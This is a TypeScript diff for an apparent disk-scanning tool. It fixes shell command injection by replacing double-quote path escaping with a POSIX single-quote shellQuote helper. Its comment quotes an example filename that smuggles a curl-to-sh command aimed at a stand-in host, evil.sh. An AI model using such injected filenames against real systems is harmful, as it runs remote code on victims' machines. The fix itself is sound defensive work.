@@ -25,6 +25,21 @@ async function withDuSlot<T>(fn: () => Promise<T>): Promise<T> {
   }
 }
 
+/**
+ * Quote a path for a shell command.
+ *
+ * Single quotes, not double: inside "double quotes" the shell still expands $(…) and
+ * `…`, so escaping only the double quote — which this codebase did in five places —
+ * left every path injectable. A file named  a'$(curl evil.sh|sh)'b.txt  in ~/Downloads
+ * ran as a command the moment it was scanned.
+ *
+ * POSIX rule: wrap in single quotes and close/reopen around any literal single quote.
+ * Nothing is special inside single quotes, so this is total rather than a blocklist.
+ */
+export function shellQuote(p: string): string {
+  return `'${p.replace(/'/g, `'\\''`)}'`
+}
+
 /** Run a shell command async — never blocks the main thread */
 export async function run(cmd: string, timeoutMs = 30000): Promise<string> {
   try {
@@ -75,7 +90,7 @@ export async function getDirSizesAsync(paths: string[], timeoutMs = 60000): Prom
   for (let i = 0; i < paths.length; i += CHUNK) chunks.push(paths.slice(i, i + CHUNK))
 
   await Promise.all(chunks.map(async chunk => {
-    const args = chunk.map(p => `"${p.replace(/"/g, '\\"')}"`).join(' ')
+    const args = chunk.map(shellQuote).join(' ')
     const out = await withDuSlot(() => run(`du -skx ${args} 2>/dev/null`, timeoutMs))
     for (const line of out.split('\n')) {
       const m = line.match(/^(\d+)\t(.+)$/)
@@ -108,7 +123,7 @@ export async function getDirBreakdown(
   const [childSizes, looseKb] = await Promise.all([
     getDirSizesAsync(childDirs, timeoutMs),
     // Files sitting directly in dirPath — small, but they belong in the total.
-    run(`find "${dirPath}" -maxdepth 1 -type f -print0 2>/dev/null | xargs -0 du -sk 2>/dev/null | awk '{s+=$1} END {print s+0}'`, timeoutMs),
+    run(`find ${shellQuote(dirPath)} -maxdepth 1 -type f -print0 2>/dev/null | xargs -0 du -sk 2>/dev/null | awk '{s+=$1} END {print s+0}'`, timeoutMs),
   ])
 
   const children = new Map<string, number>()
